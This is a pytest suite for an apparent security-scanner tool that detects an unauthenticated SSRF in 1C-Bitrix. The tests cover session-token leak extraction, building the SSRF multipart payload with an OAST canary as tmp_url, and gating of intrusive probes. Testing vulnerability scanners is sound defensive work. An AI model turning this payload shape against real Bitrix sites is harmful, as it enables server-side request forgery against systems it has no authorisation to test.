"""1C-Bitrix unauth SSRF (html_editor_action.php) — pure builders + OAST-confirmed probe."""

import pytest

from moonmcp import server as srv
from moonmcp.web import bitrix as bx
from moonmcp.web import stacks


# -- pure helpers ------------------------------------------------------------
def test_extract_sessid_from_composite_data_body():
    body = "(function(){BX.message({});bitrix_sessid:'deadbeefcafe0000deadbeefcafe0000'})();"
    assert bx.extract_sessid(body) == "deadbeefcafe0000deadbeefcafe0000"
    # also matches the bare `sessid` spelling and double quotes
    assert bx.extract_sessid('var x = {"sessid":"0011223344556677"}') == "0011223344556677"
    # too short / absent -> None (avoids matching arbitrary short hex noise)
    assert bx.extract_sessid("bitrix_sessid:'deadbeef'") is None
    assert bx.extract_sessid("nothing here") is None
    assert bx.extract_sessid("") is None


def test_extract_sessid_no_false_positive_on_suffix_tokens():
    # a quoted hex after an unrelated token that merely ENDS in "sessid" must not forge a leak
    assert bx.extract_sessid("phpsessid='deadbeefcafe0000deadbeefcafe0000'") is None
    assert bx.extract_sessid("myphpsessid = 'deadbeefcafe0000deadbeefcafe0000'") is None
    # uppercase cookie names never match the (case-sensitive) token
    assert bx.extract_sessid("PHPSESSID='deadbeefcafe0000deadbeefcafe0000'") is None
    # but the canonical spelling and a clean standalone `sessid` still resolve
    assert bx.extract_sessid("bitrix_sessid:'0011223344556677'") == "0011223344556677"
    assert bx.extract_sessid('{"sessid":"0011223344556677"}') == "0011223344556677"


def test_build_upload_multipart_shape():
    body, ct = bx.build_upload_multipart("abc123def4567890", "http://cnry.oast.test/t")
    text = body.decode()
    assert ct.startswith("multipart/form-data; boundary=")
    boundary = ct.split("boundary=", 1)[1]
    assert boundary in text
    # the SSRF-critical fields are present with the canary as tmp_url
    assert 'name="action"\r\n\r\nuploadfile\r\n' in text
    assert 'name="sessid"\r\n\r\nabc123def4567890\r\n' in text
    assert "[files][default][tmp_url]" in text
    assert "http://cnry.oast.test/t" in text
    assert "filesCount" in text and "upload" in text
    # closing boundary is well-formed
    assert text.rstrip().endswith(f"--{boundary}--")


def test_build_upload_multipart_empty_sessid_still_valid():
    body, ct = bx.build_upload_multipart("", "http://cnry.oast.test/t")
    assert b'name="sessid"\r\n\r\n\r\n' in body   # empty value, not a crash
    assert b"uploadfile" in body


# -- OAST-confirmed integration probe ----------------------------------------
@pytest.mark.asyncio
async def test_bitrix_ssrf_probe_confirms_via_selfhost(local_server, fresh_context):
    base, _ = local_server
    await srv.oast_selfhost(action="start", host="127.0.0.1")
    try:
        res = await srv.bitrix_ssrf_probe(target=base, wait=1.5)
        assert res["verdict"] == "confirmed", res
        assert res["interactions"]
        assert res["sessid_leaked"] is True
        assert res["suggested_next"]
    finally:
        await srv.oast_selfhost(action="stop")


@pytest.mark.asyncio
async def test_bitrix_ssrf_probe_unconfigured_oast(local_server, fresh_context):
    base, _ = local_server
    res = await srv.bitrix_ssrf_probe(target=base)
    assert res["error"] == "oast_unconfigured"


@pytest.mark.asyncio
async def test_bitrix_ssrf_probe_intrusive_gated(local_server, fresh_context):
    from dataclasses import replace
    base, _ = local_server
    fresh_context.settings = replace(fresh_context.settings, allow_intrusive=False)
    res = await srv.bitrix_ssrf_probe(target=base)
    assert res["error"] == "disabled"


@pytest.mark.asyncio
async def test_bitrix_ssrf_probe_registered():
    tools = {t.name for t in await srv.mcp.list_tools()}
    assert "bitrix_ssrf_probe" in tools


# -- stack_probe lane: composite_data.php sessid leak ------------------------
class _R:
    def __init__(self, status, body=""):
        self.status = status
        self._body = body

    def text(self, limit=None):
        return self._body

    def headers_map(self):
        return {}

    def get_all(self, name):
        return []


class _Client:
    def __init__(self, handler):
        self._handler = handler

    async def fetch(self, url, *, headers=None, **kwargs):
        return self._handler(url, headers or {})


@pytest.mark.asyncio
async def test_probe_stack_bitrix_sessid_leak_is_medium():
    leak = "(function(){BX.message({});bitrix_sessid:'deadbeefcafe0000deadbeefcafe0000'})();"

    def handler(url, headers):
        if url.endswith(bx.COMPOSITE_DATA_PATH):
            return _R(200, leak)
        if url.endswith("/bitrix/admin/index.php"):
            return _R(200, "<html>bitrix авторизация</html>")
        return _R(404, "")
    res = await stacks.probe_stack(_Client(handler), "https://t.test/")
    f = next(f for f in res.findings if f["product"] == "1C-Bitrix")
    assert f["severity"] == "medium"
    assert "composite_data" in f["issue"].lower() or "session token" in f["issue"].lower()


@pytest.mark.asyncio
async def test_probe_stack_bitrix_admin_only_stays_low():
    def handler(url, headers):
        if url.endswith(bx.COMPOSITE_DATA_PATH):
            return _R(404, "")            # no sessid leak
        if url.endswith("/bitrix/admin/index.php"):
            return _R(200, "<html>bitrix авторизация</html>")
        return _R(404, "")
    res = await stacks.probe_stack(_Client(handler), "https://t.test/")
    f = next(f for f in res.findings if f["product"] == "1C-Bitrix")
    assert f["severity"] == "low"
    assert "admin panel" in f["issue"].lower()


@pytest.mark.asyncio
async def test_probe_stack_bitrix_clean_no_finding():
    res = await stacks.probe_stack(_Client(lambda u, h: _R(404, "")), "https://t.test/")
    assert not any(f["product"] == "1C-Bitrix" for f in res.findings)
